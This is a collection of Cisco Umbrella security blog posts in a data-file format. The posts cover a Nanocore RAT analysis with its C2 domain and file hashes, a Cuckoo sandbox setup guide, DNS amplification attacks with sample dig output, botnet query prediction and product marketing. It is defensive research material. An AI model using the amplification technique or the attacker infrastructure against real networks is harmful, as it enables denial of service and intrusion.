tree of the malware looks something like this. When the .scr file is executed, it invokes wscript.exe which helps to execute the vbs script. As discussed earlier, the vb script contains a variable oddshl which causes “agj.exe gjm=loo”, to be executed. This triggers the DLL injection which spins a child process RegSvcs.exe. This is where the actual trojan resides. Attacker’s Infrastructure After executing the trojan in a sandboxed environment to do dynamic analysis, we see that the file exhibits Nanocore RAT behavior. Nanocore is a modular remote access trojan (RAT). Its infection method is through spam emails, attachments, and software bundles. Nanocore is able to disable antivirus software, bypass firewalls and make registry modifications. This threat can lead to the installation of additional malware and the loss of sensitive information. During this analysis the RAT made a callout to the dynamic DNS (DDNS) domain of nikkycharles3[.]ddns[.]net which would be the command and control server (c2 server) where the malware can receive commands to initiate different modules, drop additional malware, or send stolen information. Query volume timeline taken from Cisco Umbrella Investigate Once we had the DDNS domain that was acting as the c2 server, we started investigating the hosting infrastructure. The hosting IPs hosted many more DDNS domains and we were able to find additional malicious artifacts and RATs that were communicating to them. The attacker’s infrastructure is primarily located in Nigeria on ASN 36873. You can find a full list of IOCs at the end of this blog post. They include 79 hosting IPs and over 200 c2 servers. Why Umbrella? Umbrella protects users from connecting to malicious sites on the Internet and analyzes over 180 billion DNS requests daily. The sheer volume of DNS requests gives our Researchers a unique view of the Internet to better identify trends on threats, faster. Our statistical models and threat hunting techniques allow our Researchers to be aware of an attacker’s infrastructure before new attacks can launch. Interested in trying out Umbrella? Sign-up for a free 14-day trial today. IOCs: Initial Files: 4fc39b14caa8a3cdca1c57b157b0dd2bd8ec49dc7c550e3811a8bb95f1244927 fb73a819b37523126c7708a1d06f3b8825fa60c926154ab2d511ba668f49dc4b", "date": "2019-11-01"},
{"website": "Cisco-Umbrella", "title": "Protective DNS: What it is, why it matters, and what you need", "author": ["Andrea Gross"], "link": "https://umbrella.cisco.com/blog/protective-dns-what-it-is-why-it-matters-and-what-you-need", "abstract": "Earlier this month, the National Security Agency (NSA) and Cybersecurity Infrastructure Security Agency (CISA) issued an advisory on the growing need to introduce a protective DNS (PDNS) solution to your organization’s security footprint. Because DNS is foundational to most online activity, it’s also the layer where many attacks — including malware, phishing, command and control, and domain generation algorithms — first strike. Analyzing and protecting your organization’s DNS queries is a key defensive strategy, and the right PDNS solution can make a major difference in your security posture. From malicious links in phishing emails to bogus URLs that prey on common misspellings of web addresses, cyber attackers use domain names across the entire network exploitation lifecycle. While many enterprises already employ some degree of DNS security, not all solutions are created equal — not every platform, for instance, can address compromised upstream DNS infrastructure or maliciously provisioned DNS registrations. That’s part of the reason why the CISA recommends PDNS specifically — it includes a policy-implementing DNS resolver that returns answers to queries based on specific criteria within those policies. This resolver checks both the domain name queries and the returned IP addresses against threat intelligence, preventing connections to known or suspected malicious sites. PDNS solutions categorize domain names as malicious or not by tapping into the latest threat intelligence — the quality of that threat intelligence, then, makes a major difference in your ability to identify and block threats. Most DNS security providers rely on the same open source and government threat intelligence feeds that everyone has access to. Cisco’s DNS security goes further. Our PDNS — included as part of the Cisco Umbrella multi-function security service — taps into an entirely different level of threat intelligence, leveraging: Real-time DNS data — gathered from 620 billion daily internet requests — further enriched with both public and private threat data Proprietary intelligence from Cisco Talos, one of the largest private threat intelligence groups in the world Statistical models that automatically score and classify all of our data, so we can detect anomalies and uncover both known and emerging threats Cisco Umbrella also includes access to Umbrella Investigate, a unique interface that provides the most complete view of the relationships and evolution of internet domains, IPs, and files —the context you need for faster incident investigation and response. Following millions of security events happening in real-time, Investigate learns from internet activity patterns, automatically identifying the infrastructure attackers use, so you can predict future threats. We give you access to this intelligence so you can get more out of your existing security investments and become more proactive at combating the next cyberattack. “Umbrella Investigate is a Swiss Army knife for understanding endpoints on the internet. Using Investigate, we get insight into what’s happening, why, and what we need to do.” Joseph Paradi Executive – ITS Enterprise Services, Avanade And that’s just some of the advantages Cisco Umbrella offers in PDNS. On-premise appliances and hybrid-cloud solutions don’t always have the horsepower to stay on top of malicious queries. Completely cloud-native, Cisco Umbrella has what it takes to actively process and enforce more than 7 million unique malicious domains and IPs concurrently at the DNS layer, blocking 60,000+ new destinations every day. Plus, as a cloud-based service, Cisco Umbrella can deploy across your entire organization in minutes, making it one of the easiest ways to protect your users. All Cisco Umbrella packages provide roaming protection for Windows, MacOS, iOS, Chrome OS, and Android devices, no matter where a user may go. Cisco Umbrella’s PDNS service provides visibility and protection for all internet activity, anywhere your users access the internet. The CISA said it best: Protective DNS is quickly becoming the new security mandate for your organization. But you need a solution supported by the very best threat intelligence — and Cisco Umbrella has it. Check out the full CISA report for more details — and learn more about how Cisco Umbrella can help in a 2-part DNS Protective Seminar . Join us for part 1 on Wednesday, April 14, 2021 at 1pm ET and learn why Umbrella is the industry leading DNS security efficacy solution, leveraging 30+ statistical models to analyze 200B DNS requests and identify 60k new malicious destinations a day. Then join us for part 2 on Wednesday, April 28, 2021 at 1pm ET where we’ll show you Cisco Investigate in action.", "date": "2021-04-06"},
{"website": "Cisco-Umbrella", "title": "Deploy Your Own Cuckoo Sandbox", "author": ["Kevin Bottomley"], "link": "https://umbrella.cisco.com/blog/deploy-your-own-cuckoo-sandbox", "abstract": "Enter the mighty Cuckoo Sandbox Whether you’re an amateur cyber-sleuth or a seasoned reverse engineer, having the right tools in the toolbox is essential for the task. Running samples on your main system is just, in general, a bad idea all around. I won’t attempt to cover all of possible items out there, as the list is long. I will, however, go over a simple setup involving Cuckoo Sanbox that will allow you to get some good insight into malware behavior. So you wanna play with some malware huh? A popular tool among security professionals is the open-source Cuckoo Sandbox . Cuckoo Sandbox will allow you to submit files and URLs, analyze the data, and return the results in nicely laid out format. There are a few different forks out there, but in this case, we’re going to stick with the original, which can be cloned from here . One might ask: “But aren’t there already publicly facing versions out there that will do this for me?”, and the answer to that is: yes. The people over at Malwr have kindly deployed one of these said instances, and it works amazing. However, there are a couple downsides to using cloud based analysis tools. The first and foremost issue is that when you upload samples to places such as Malwr and VirusTotal , malware authors, who can also use these same services, may see that their work has been captured, and make changes to the code, thus, giving them an edge to alter detection methods. The second downside is that the 3rd Party tool you are using might itself be down for any one of various reasons. Or number three, perhaps you are like me, and like to keep all your samples and data close by. At this point, we’re going to go with item three, and deploy our own sandbox to play in. Cuckoo has great detailed documentation about how to install it, and works quite well out of the box. Along with the documentation, there is also a wealth of articles out there you can read. Yet, one thing I noticed is that a lot these articles are a bit old (in Internet years that is). While building up my sandbox, I spent a number of hours that lead into days scouring the Internet for various ways of deploying and hardening the system. I’ll save you all of the time and instead give you what I learned during my trial and error period. You could go through all the docs from the aforementioned link, and install all of the needed library’s, modules, and databases individually, and that is fine. However, while doing my research, I discovered that David Reguera (@fr33project) was already nice enough to take the majority of this work and put it all into a nice, tidy, bash script . The script will install, clone, and setup all of the basic necessities to get up and running. It will also make a new user named ‘cuckoo’ for you to run the sandbox under. A couple points of note: 1) on line 41 of the script, you will want to change ‘debian'(if you are not using Debian that is) to whichever distro of choice you are using, i.e. if you decided to use Ubuntu as your host machine, you should change that line to reflect said distro, and 2) if you decided to change the new user name to your existing user, the permissions in the script will bork you out of your admin access if you have not already added yourself to the visudo file, and you will spend the next several minutes having to hack around your box to regain your admin privileges, so be forewarned. Upon completion of the script you will also have VirtualBox installed (if it’s not already), which you will use to house your guest (read: target) virtual machine(s). You can also use VMWare, but the default configuration files for Cuckoo are already setup for VirtualBox. Your guest Operating System(s) can be whatever you choose. I recommend using as many different ones as possible, and have, at the very least, a nice, highly vulnerable Windows XP going. If you have the space on your hard drive, it’s recommend the size of the Guest OS be greater than 60GB. For Cuckoo to work, the guest OS requires a script called ‘agent.py’, which you can find in the /path/to/cuckoo/agent directory. Now would be a good time to install the VirtualBox Guest Additions to make importing this script a bit easier. By putting the agent.py script in your guest OS system under the users Startup folder and renaming it to ‘agent.pyw’, it will start up automatically every time(the ‘w’ makes it so the script starts up hidden). For this to work, you will also have to install Python , and it is also recommended to install the Python Imaging Library . At this point, it’s a good idea to take a snapshot of the system and restart the guest OS and run task manager to make sure the agent script is running the way it should be. If all that looks good, it’s time to move on and add some vulnerable applications for your samples to try and exploit. Heading over to oldapps.com , you can find a plethora of software to choose from. Here the choice is yours on what to install, but you should stick with old versions of Internet Explorer, Flash, Silverlight, and Reader at the bare minimum. Take a new snapshot at this point so Cuckoo will use everything you have just installed. So far, the following should have been done: Run script to install and setup cuckoo Installed Guest OS into VirtualBox Installed agent.py script into Guest OS Installed some old, vulnerable applications Take a snapshot Once all of the above steps are completed, you should now change the network settings of the Guest OS. The first step is to change the IP of the Guest from DHCP to something static, with 192.168.56.101 being the default in the /path/to/cuckoo/conf/virtualbox.conf file, so I recommend to just go with that. Next change the network settings of VirtualBox from NAT to Host-Only, and change, at the least, the first six bits of the MAC address to anything other than 080027, as some malware will check this, and determine it’s running in a VirtualBox environment. Harden your sandbox against VM detecting malware The next stop in the process is to harden up your Guest OS from vm-aware malware. Yes, this is a real thing. Some malware will actually detect it’s running in a sandbox, and perform differently, if at all. You can see for yourself by running this executable written by Alberto Ortega (@a0rtega). You’ll be able to see, most likely, a bunch of red ‘traced!’ items in the command window that appears on the Guest OS after uploading the sample. This is bad, and means that real malware will also detect you are trying to analyze it. No fun. Fear not though, for there is a .dll for that! With the Cuckoo community being what it is, and the open-source awesomeness that also comes along with it, there are all kinds of ways to expand your Cuckoo installation. Mark Doe(@mark_ed_doe) created this cuckoomon.dll patch to make the VM less detectable. For this, I copied the original cuckoomon.dll found in /path/to/cuckoo/analyzer/windows/dll/cuckoomon.dll to: original_cuckoomon.dll and then copied the new .dll into the same directory. Make sure you: $ chmod -x cuckoomon.dll If you are all done with the VirtualBox Guest Additions, you should now uninstall it from the Guest OS to help mitigate any residual VirtualBox giveaways. Snapshot time again! Let’s run the pafish.exe again. This time, you should see a lot less red, and a lot more green. This is where we want to be, as you’ve now made your sandbox less detectable. One part I haven’t been able to figure out yet is the mouse integration detection, but I think if you turn off mouse integration this might do the trick. Unfortunately it’s kind of a pain to scroll back up in the command window while running the pafish.exe with the integration turned off to see if this does indeed help against that detection. You can deploy more than one VM, but you will have to use a different database than the default setup, as well as a couple other modifications that you can read about in the docs(you should read the docs anyway, as they are way more verbose about the integrals of how Cuckoo works). You are now ready to start running samples through your sandbox, if you don’t have any yet, or want to expand, there are a couple of places you can go and retrieve some. A couple of good places to start are the sites malware-traffic-analysis.net and kernelmode.info . Sources: http://www.cuckoosandbox.org/ http://www.wired.com/2014/09/how-hackers-use-virustotal/ https://github.com/buguroo/cuckooautoinstall/blob/master/cuckooautoinstall.sh https://github.com/a0rtega/pafish/blob/master/pafish.exe https://github.com/markedoe/cuckoo-sandbox/blob/master/cuckoomon.dll http://www.oldapps.com/", "date": "2015-06-16"},
{"website": "Cisco-Umbrella", "title": "DNS Amplification Attacks", "author": ["David Cornell"], "link": "https://umbrella.cisco.com/blog/dns-amplification-attacks", "abstract": "As one of the world’s largest open DNS resolvers we are constantly on the lookout for abuse of our service, especially when it means we would be taking part in an attack against other networks.  DNS amplification attacks are one popular method attackers use to increase their arsenal by abusing larger services such as OpenDNS. Even though this type of attack has been happening for a long time we are still seeing a large number of attacks using this method. In this post I will briefly describe how these attacks work and shed some light on how often they occur. I will then give you some ideas in how you can protect yourself from these attacks as a website operator and advise how you can avoid taking part in such attacks as a DNS server administrator or network administrator. Amplification attacks are a form of denial of service attack.  Attackers use open internet services such as DNS resolvers and NTP servers to increase the amount of bandwidth sent to the victim and overwhelming their capacity. With no bandwidth remaining to service real customer requests, the victim’s website is unable to service requests for real users. The reason it’s called an amplification attack is because the attacker only needs a small Internet connection, while still being able to deluge the victim with traffic. The diagram below gives a high level overview of how a DNS amplification attack works: As you can see, an attacker can use relatively few machines with little bandwidth to launch fairly substantial attacks. This is done by spoofing (or faking) the source IP of the DNS request such that the response is not sent back to the computer that issued the request, but instead to the victim. This is easy since the protocol that DNS relies on is UDP and as such there is no verification that the source IP address is in fact the sender. Using very simple tools the attacker can send many thousands of spoofed requests to open resolvers and the responses, which are much larger than the request, amplify the amount of bandwidth sent to the victim. The chart below shows the number of attacks we see over a 24 hour period. Digging into these attacks, we see that attackers often issue a special type of DNS request called an ANY request. ANY requests ask the DNS resolver for ALL information that it currently knows about the domain which may include where the mail servers are (MX records), what the IP addresses are (A records) and so on. Attackers use this type of query to maximize the size of the response sent to the victim. Using our analytics platform, we can outline the exact domains used in these attacks, how long the attack lasted, who the intended victims were and the intended size of the attack. We can also estimate the approximate source location of the attacks even though the packets are spoofed. This is possible because we use Anycast which is a networking technology used to route customer requests to the nearest OpenDNS resolver in one of our datacenters around the globe. We can use this metric to estimate how distributed the attack is. The table below shows a small sample of the domains used over the same 24 hour period: Attackers use both legitimate domains as well as domains used to increase the impact of the attack. For example, fkfkfkfc(.)biz is one such domain that was setup specifically to take part in these attacks.  They do this so they can fill up the DNS response to be as large as possible. Below is the dig output for this domain: $ dig fkfkfkfc(.)biz @109.235.51.184 ;; Truncated, retrying in TCP mode. ; <<>> DiG 9.8.3-P1 <<>> fkfkfkfc(.)biz @109.235.51.184 ;; global options: +cmd ;; Got answer: ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 24993 ;; flags: qr aa rd; QUERY: 1, ANSWER: 236, AUTHORITY: 2, ADDITIONAL: 2 ;; WARNING: recursion requested but not available ;; QUESTION SECTION: ;fkfkfkfc(.)biz. IN A ;; ANSWER SECTION: fkfkfkfc(.)biz. 86400 IN A 204.46.43.157 fkfkfkfc(.)biz. 86400 IN A 204.46.43.158 fkfkfkfc(.)biz. 86400 IN A 204.46.43.159 fkfkfkfc(.)biz. 86400 IN A 204.46.43.160 … Repeated hundreds of times … fkfkfkfc(.)biz. 86400 IN A 204.46.43.154 fkfkfkfc(.)biz. 86400 IN A 204.46.43.155 fkfkfkfc(.)biz. 86400 IN A 204.46.43.156 ;; AUTHORITY SECTION: fkfkfkfc(.)biz. 86400 IN NS ns21.fkfkfkfc.biz. fkfkfkfc(.)biz. 86400 IN NS ns22.fkfkfkfc.biz. ;; ADDITIONAL SECTION: ns21.fkfkfkfc(.)biz. 86400 IN A 109.235.51.184 ns22.fkfkfkfc(.)biz. 86400 IN A 109.235.51.184 ;; Query time: 190 msec ;; SERVER: 109.235.51.184#53(109.235.51.184) ;; WHEN: Sat Mar  1 20:17:45 2014 ;; MSG SIZE  rcvd: 3876 As you can see a request that is only 64 bytes becomes 3876 bytes sent to the victim. A recent attack measured by Cloudflare weighed in at 400Gbps, one of the largest attacks seen to date. That would require an attacker issuing over 200,000 of the above requests per second to open resolvers around the globe. While some attacks are very short lived, we have seen several sustained attacks lasting many weeks. We also notice that while the custom crafted domains used in these attacks do change, it’s not very often, sometimes lasting many weeks. So what can you do to protect yourself from such attacks? As a website operator you may want to use a DDOS protection service such as those offered by Cloudflare, Verisign, and Arbor Networks. As a DNS or NTP server administrator you should make sure your resolver is not open to the internet. If you use Bind you can disable recursive resolving like so: options {    recursion no; }; You should also restrict Bind to answering questions from your internal network: options {    allow-query {192.168.1.0/24;};}; If you use an external DNS resolver, check if it is open and suggest to the ISP or operator to restrict access to only their networks. What can I do to protect my network from participating in such attacks? Ensure that you are performing egress filtering on your edge devices. This type of filtering prevents spoofed packets from leaving your network, thereby preventing malicious devices in your network participating in attacks relying on the ability to send spoofed packets to the internet. Trouble ahead? In this blog I have explained one form of amplification attack that has been abused for a long time. NTP Server amplification attacks are becoming much more common as the amplification factor can be much higher. SNMP servers are now also being used to amplify traffic and have the potential for much larger impact since the responses can be much larger than DNS and NTP. As protocol writers, service developers, network administrators, and end users we have our work cut out for us. At OpenDNS we take this abuse of our service very seriously and continue to fine tune our defenses. In a future post, we’ll describe some of the cool techniques we use to mitigate our involvement in these attacks. Additional Resources: DNS Amplification Attacks Observer Cloudflare blog", "date": "2014-03-17"},
{"website": "Cisco-Umbrella", "title": "Dominos, Botnets, and a little LSTM", "author": ["David Rodriguez"], "link": "https://umbrella.cisco.com/blog/dominos-botnets-little-lstm", "abstract": "Introduction Suppose you were to watch a stream of numbers… and given the previous number you saw you had to predict what the next number should be. For example, suppose you saw 1,2,1,2,… We might guess: 1. Or perhaps, what if you saw 0,0,1,2,3… ? Should it be 4? It almost feels like a domino effect. In this post we walk through predicting a specific type of spike in domain queries associated with some botnets. These domains spike like falling dominos: 0,0,0,1,2,3…. In this post we will Explore our ability to make predictions about the number of future queries to a given domain. Provide a recipe that can be incorporated on an hourly basis to a given watch-list of domains. Something you can do if you have Python, PyBrain, and some data from the OpenDNS investigate UI The Problem Below we track the amount of queries made to 8 different domains (per hour) for the last 5 days. Here the queries per hour in a domain appear to follow a sinusoidal pattern (with minor hiccups). These patterns are fairly predictable. On the other hand, consider the following domains: Here we see 5 domains spiking around the same time and in contrast we see two domains following a characteristic sinusoidal pattern. Obviously, we would like to predict when a domain will spike. Perhaps you are familiar with recurrent neural networks and related problems, then you might want to skip down to the Github gist and just check out the code. Otherwise, carry on. Recurrent Neural Networks and LSTMs To do this we will use and train a recurrent neural network with long and short term memory (LSTM) using the Pybrain module. A recurrent neural network (rnn) is a popular choice when trying to classify or predict elements from sequential data (think of data from the stock market, speech, and even tweets). The most notable characteristic of rnns is that they are a neural network with directed cycles between adjacent neural network modules. While, on the other hand, LSTM networks are a special kind of rnn with connections between non-adjacent neural network modules. For more check out this overview . Training Like most neural networks we train them to minimize some sort of loss function related to the input and some output. In this case, we wish to input one number and predict the consecutive number. Therefore we wish to minimize our errors in predicting the next number. Given about 100 domains and the last 5 days of queries per hour we train the LSTM network… over 5 epochs and 100 cycles. We see the error rate reduce over the training set as the epochs increase and the more data is utilized in training the network. Here we feed in one sequence of queries from one domain at a time and then calculate the error over a subset of the training data per epoch. Predictions The first result we will study is a spiking domain. This domain, of course, is what we are mainly interested in, but it also serves as a good place to discuss the performance of the LSTM networks. In Figure 3 you will see the spiking domain with the actual query traffic in black and the predicted in blue. We need to break down this graphic a little. First notice, how the black curve shows sharp transitions while the blue tends to lag and almost follow a rolling average. Second, notice how the blue curve appears slightly shifted to the right from the black. With respect to the blue curve softening transitions and appearing shifted or translated to the right, we actually can identify the error in our LSTM. In fact, to more clearly see this I interleaved black diamonds on the black curve for every hour in which the domain was just about to increase. Similarly, I interleaved blue dots on the blue line for every hour in which the domain was just about to have a predicted increase in queries. In the figure to the left, we have zoomed into the moment prior to the largest spike. Here, we see the black diamond (circled in red) representing one of the largest amounts of queries per hour for this domain within the time window. Unfortunately, the blue dot (circled in red) shows what the LSTM network predicted the next value to be. Unfortunately, the LSTM network predicted the volume of queries in the next hour to decrease, while in reality the anomaly of the black diamond was more of an indicator that the domain was about to have a spike in the volume of queries in the next hour. In this case, we see the limits of the currently trained LSTM network. For example, in the successive queries per hour, the LSTM tends to predict values which are relatively similar to the values that were given as input. In fact, check out the following examples. These examples are like the one just described where the real domain traffic is in black and the predicted in blue. So as you can see from the figures above that the LSTM network we trained with PyBrain seems relatively limited in its ability to predict spiking queries in subsequent hours for a domain. So where do we go from here? Well, notice, one of the upshots of our analysis: we are exploring our ability to make predictions about the number of future queries to a given domain. This is slightly different than detecting anomalies more generally, for the simple reason that the methods we have been describing are proactive, not reactive. If predictive ability is what you’re after, then there are a couple choices for us. One choice, is begin to play around with the LSTM network structure. For example, trying out different number if hidden layers and units. In addition, given our initial results here we might be encouraged to take this model but train it on more data. If that’s the case, we may start to explore the relative payoff of using either Theano or Tensorflow . In addition, we have tried to keep this analysis small and repeatable for anyone who has access to Python, PyBrain, and some of the data one can get from the OpenDNS investigate UI. We tried to keep this brief and are indebted to the PyBrain developers and StackExchange contributors. Lastly, as we iterate and improve on this model, we have explored a recipe which can be incorporated into a watch-list of domains where every hour one retrieves the amount of queries to that domain, and predict the subsequent hour, and can with fairly simple methods detect when a domain with deviate substantially from the previous queries per hour. A simple test for anomalies is outlined in the code below. Code Review Thanks for reading.", "date": "2016-09-06"},
{"website": "Cisco-Umbrella", "title": "Cisco Umbrella 1 Million", "author": ["Dan Hubbard"], "link": "https://umbrella.cisco.com/blog/cisco-umbrella-1-million", "abstract": "Here at Cisco Umbrella, we have a culture and passion for giving back to the technical community. This has included projects such as: our free consumer OpenDNS service , Phishtank , DNSStream , BGPStream , DNSCrypt , and several other data sources. With that, we are very excited to announce the Cisco Umbrella 1 Million — a free list of the top 1 million most popular domains. This project came from our most recent hack-a-thon where we had more than 300 participants across 3 different countries hack for 24 hours. Hack-a-thons are an important piece of our engineering team’s culture and showcases their passion to build. On the heels of the announcement that the Alexa 1 Million list was not going to be available for free anymore, the idea was that we have the data and the means to provide an alternative. The data itself is based on the Cisco Umbrella global cloud architecture that processes approximately 620 Billion requests per day, across more than 24K customers, in more than 165 countries. Although the data source is quite different from Alexa’s, we believe it’s arguably more accurate as it’s not based on only HTTP requests from users with browser additions. The way the ranking is computed is not as simple as the net sum of all DNS queries. We have built our own popularity algorithm which uses the number of unique client IPs visiting this domain, relative to the sum of all requests to all domains. We take a score of how many different client/unique IPs go to this domain compared to others, and then rank the domains based on that. Our domain (vs site) ranking reflects the popularity of internet activity over any port or protocol from any application and not just web activity over port 80 from browsers. Calculated and published daily So, moving forward we will be calculating and publishing the list of the top 1M domains daily! This will be in order of popularity. This also included the TLDs (top level domains). For example did you know that google.com is more popular than aggregating all queries for the entire .org TLD? List Format One comma delimited tuple per line Rank first, followed by domain Example 1,com 2,net 3,google.com 4,org 5,googleapis.com 6,facebook.com 7,microsoft.com 8,www.google.com 9,doubleclick.net 10,g.doubleclick.net We hope you enjoy our new data set and please follow us on Twitter for updated news on the latest Cisco Umbrella 1M lists and features. The Cisco Umbrella 1M data is available free of charge here . Get the Cisco Umbrella 1 Million", "date": "2016-12-14"},
{"website": "Cisco-Umbrella", "title": "Cisco Umbrella unlocks the power of SASE with new security capabilities", "author": ["Meg Diaz"], "link": "https://umbrella.cisco.com/blog/cisco-umbrella-unlocks-the-power-of-sase-with-new-security-capabilities", "abstract": "Secure access anytime, anywhere After the massive shift to remote work, more organizations are moving to a model where networking and security converge together in the cloud. Gartner coined the term secure access service edge (SASE) to describe this concept. Today, we announced how we’re delivering on our vision of SASE by combining networking, security, and observability components into a single offer, which will be orderable in May 2021. In the future, we will deliver it all as a single subscription service . There’s plenty that you can take advantage of today! We are rapidly delivering new functionality — across networking and security — that helps you unlock the power of SASE. Let me walk you through a deeper dive on the new security features we announced in Cisco Umbrella. Rapidly delivering new functionality Cisco Umbrella is one of the core components of Cisco’s SASE architecture. It integrates multiple components that were once standalone security services and appliances in a single, cloud-native solution. If you look back a few years ago, Cisco Umbrella was known for delivering DNS-layer security. We have rapidly added capabilities including secure web gateway, firewall, cloud access security broker, and more to our cloud service. We’re not stopping there! Today, we’re excited to announce limited availability of new functionality including remote browser isolation, data loss prevention, and cloud malware detection. ​ Remote browser isolation (RBI) Think about how much of your day is spent online. And here’s a fun game — how many browser tabs do you have open right now? I have 21 (yikes). With so many people working remotely, the need for fast, secure access to the internet, online documents, SaaS apps, etc. has never been greater. But existing security may not be able to protect against malicious, browser-based zero-day threats. Enter remote browser isolation. Cisco Umbrella’s remote browser isolation gives an added layer of defense against browser-based attacks — without compromising the end user experience or burdening the IT staff. It isolates web content in a remote surrogate browser in the cloud, essentially think of it as a secure container, separate from the endpoint. All risky code and dynamic content runs in the surrogate browser, and only safe content is rendered to the user’s browser. Remote browser isolation allows users to safely browse websites, while protecting devices and corporate networks from browser-based exploits. And, you can deploy it rapidly without changing existing browser configurations or needing additional plug-ins. It’s a win-win-win — improve security without impacting end users or IT staff. Data loss prevention (DLP) The concept of data protection is certainly not new, but has become more complex as users connect directly to the internet and cloud apps, and bypass traditional on-premises security. Cisco Umbrella’s data loss prevention helps to simplify that complexity. It sits in-line and inspects web traffic, so you can monitor and block sensitive data in real time with flexible controls. More than 80 pre-built policies can be enabled to detect specific types of information such as credit card numbers or personally identifiable information. You can also create custom data classifiers for more specific policies. Cloud malware prevention Where is malware lurking? Hello cloud apps. As more business-critical data moves to cloud-based applications, you not only need to control access and use of the data, but you also need to make sure those cloud applications are not compromised by malware. With cloud malware protection, Cisco Umbrella detects and removes malware from cloud file storage apps to prevent the spread of malware infections laterally on your network. You can scan cloud file storage repositories for malware and detect potentially malicious files that are uploaded or edited. Once identified, you can take corrective action to quarantine or delete malicious files, and generate reports on usage, potentially compromised accounts, and potential threats within the network. Invest in a long-term security strategy Aside from these new Cisco Umbrella features, we’ve made additional investments to help you on your SASE journey. We have a new integration with Meraki MX​ devices and Cisco Umbrella license portability for Cisco Secure Web (formerly WSA). Simplified cloud security deployment with Meraki MX Previously, we announced integration between Cisco Umbrella and SD-WAN powered by Viptela. Now, we’re expanding support for Meraki MX. This integration makes it simpler and faster to deploy Cisco Umbrella’s cloud security across distributed locations that use Meraki MX devices. For some organizations, DNS-layer security may be sufficient. Or you may wish to deploy via IPsec tunnels for advanced inspection and control of web and non-web traffic on all ports and protocols to secure users at the edge, from any device, with consistent, highly effective protection. ​Protecting on-prem investments as you move to the cloud It’s challenging to manage a transition from on-prem toward hybrid or cloud environments while still protecting your existing investments​. With new flexible license options, new or renewing Secure Web (formerly WSA) customers can convert licenses from Cisco Secure Web to Cisco Umbrella. You can buy Cisco Secure Web and Cisco Umbrella licenses together or convert licenses from Cisco Secure Web to Cisco Umbrella to support your cloud or hybrid deployment at every point in the journey. I’m excited about the future of security at Cisco and the promise of SASE. To learn more about the new Cisco Umbrella features and how we’re working hard to help our customers and future customers simplify their complex security stacks in the cloud, watch the on-demand video from Cisco Live. You can also read more about what’s new on our website .", "date": "2021-03-30"},
{"website": "Cisco-Umbrella", "title": "Cisco launches new Secure Access Service Edge (SASE) data centers in Northern Europe for security customers", "author": ["Andrea Gross"], "link": "https://umbrella.cisco.com/blog/cisco-launches-new-secure-access-service-edge-sase-data-centers-in-northern-europe-for-security-customers", "abstract": "Cisco Umbrella recently added new data centers to serve customers in Denmark and Sweden and we could not be more excited! When selecting data center locations, we look at several criteria, including the number of users in that region and the transit and peering options that define our ability to improve service for our users. Adding these data centers to our architecture means customers have closer access to the cloud anytime, anywhere, providing additional opportunities to process usage and event data locally. What else does the addition of Nordic data centers to the Cisco Umbrella global cloud architecture bring for you? Read on to find out! Cisco Umbrella and its global cloud architecture is a key component of Cisco’s Secure Access Service Edge (SASE) offering. Learn more about SASE with our At a Glance . Cisco Umbrella helps unify firewall, Secure Web Gateway (SWG), DNS-layer security, Cloud Access Security Broker (CASB), and threat intelligence into a single cloud service – allowing businesses of all sizes to secure their users everywhere they work. Traffic latency decreases with the optimal usage of a hybrid multi-cloud infrastructure – maximizing resilience! Anycast routing intelligently directs traffic to the closest Umbrella data center, bypassing degraded or unavailable links automatically. Imagine a built-in customer assistant providing you with the best possible availability, reliability, and quality. There is no longer a need to manage load balancers, routing policies or configure files. When planned maintenance or unplanned interruptions occur, failover happens automatically and maintains redundancy. For example, if a customer selects Stockholm as its primary Umbrella data center and that center is taken down for maintenance or unexpectedly fails, the address space is advertised out to the other data center in the region pair – Copenhagen. This means a stress-free automatic tunnel fail over where no customer intervention is needed. Umbrella peers directly with more than 1000 organizations to continuously boost performance and help ensure the fastest route for requests by creating shortcuts through the internet topography for our customers’ encrypted traffic. By utilizing more than 6000 peering sessions with partners like Netflix, Google, and Facebook (just to name a few), we decrease latency and improve performance between our customers and their networks. Data centers for Cisco Umbrella, like Copenhagen and Stockholm, are intentionally located near the Internet Exchange Points (IXPs) for faster, more reliable service. These data centers are carrier-neutral, selected purely on the location’s ability to provide the best quality connections and services to the regions served. Both Cisco Umbrella Nordic data centers meet or exceed Uptime Institute Tier III standards , meet all common security compliance standards (ISO27001/SOC2), and are General Data Protection Regulation (GDPR) compliant. In addition to meeting and exceeding all compliance standards, we also want to ensure we operate as a greener organisation while working to build a sustainable model for the future. Both new data center locations – Copenhagen and Stockholm – use 99% renewable energy. In addition, the Cisco UCS servers used are Energy Star and have the best power-to-performance ratio in the industry. We invite you to learn more about how the Cisco Umbrella global cloud architecture brings cloud access closer to you. More news from Cisco: Cisco Announces New Data Center to Serve Collaboration Customers", "date": "2021-03-23"},
{"website": "Cisco-Umbrella", "title": "The Good, the Bad, and the Parked", "author": ["Anthony Kasza"], "link": "https://umbrella.cisco.com/blog/the-good-the-bad-and-the-parked", "abstract": "A parked domain is a domain name that has been registered and is serving temporary content, is being held for future use, or is being used for monetization purposes. Some parked domains serve custom 404 pages, redirects, or advertisements. Parked domains often serve ads to visitors as a mechanism for generating revenue for the domain owner. As more visits translate to more ad impressions and more ad impressions translate to more money for the domain owner, parked domains meant for monetization often use tricks to increase traffic volumes. These tricks include typo squatting, SEO trickery and search term mining, as well as name “guesses” (e.g. is a user is looking for spare car parts, they may type “carparts.example.com” into their browser). How to Determine If a Domain Name is Parked There are a few methods of identifying if a domain is parked or not. As Dhia Mahjoub pointed out previously , comparing the resolution between the domain name and a random subdomain can be used to determine if a single domain name is parked or not. Comparing the content served back from the server with varying HTTP referer headers is another way as parked domains often tailor ad content based on search engine queries. For example, if you end up visiting a parked domain and the referer is from a Google search for puppies, the ads on the parked domain may be for things like dog food or dog toys. Another indicator of a single domain being parked is how many other domains are also resolving to the IP address that name resolves to. A large amount of domain names resolving to a single IPv4 address often indicates a parking IP or a shared hosting provider. This technique makes use of passive DNS data. Another technique which uses passive DNS data is to look at the number of domains the name servers of the domain in question are authoritative for. Name servers which have been delegated a large number of domain names (something like 15,000 or more) are often authorities for parked domains. Lastly, looking at the number of third party locations referenced in the source of the HTML served back from the domain is another indicator. As parked domains contain mostly dynamically loaded advertisements. Recently a paper was published at the 2015 Network and Distributed System Security (NDSS) Symposium which outlined ways of identifying parked domains based on DNS records and HTTP content. The paper is a very good read and the accompanying Github is fantastic. We on the research team have adapted some of the techniques used in this paper to classify parked domains. Notes of Interest While exploring the techniques used in the paper previously mentioned, we came up with a novel mechanisms for comparing two domain’s HTML content. Using RabbitMQ , 